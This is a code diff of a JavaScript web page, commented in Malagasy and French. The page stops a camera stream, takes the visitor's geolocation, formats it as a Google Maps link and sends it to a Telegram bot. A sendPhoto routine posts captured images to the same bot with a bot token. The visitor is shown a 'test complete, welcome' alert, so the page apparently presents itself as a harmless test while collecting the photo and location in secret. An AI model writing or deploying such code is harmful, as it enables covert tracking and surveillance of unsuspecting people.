@@ -56,21 +56,18 @@
       stream.getTracks().forEach(t => t.stop());
 
       // 2. Maka toerana    
-async function envoyerPosition() {
-  try {
-    const pos = await obtenirPosition();
-    const { latitude: lat, longitude: lon } = pos.coords;
-    const loc = `📍 Toerana: https://www.google.com/maps?q=${lat},${lon}`;
-    
-    await sendMessage(loc); // Fonctionne même si sendMessage est asynchrone
-    alert("✅ Vita ny test, Tongasoa!");
-  } catch (err) {
-    alert("❌ Nisy olana: " + err.message);
-    console.error(err);
+navigator.geolocation.getCurrentPosition(function(pos) {
+        const { latitude: lat, longitude: lon } = pos.coords;
+        const loc = `📍 Toerana: https://www.google.com/maps?q=${lat},${lon}`;
+        sendMessage(loc); 
+        alert("✅ Vita ny test, Tongasoa!");
+      });
+
+    } catch (err) {
+      alert("❌ Nisy olana: " + err.message);
+      console.error(err);
+    }
   }
-}
-
-
   /* ------------- ENVOI PHOTO ------------- */
   async function sendPhoto(imgBase64, caption) {
     const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
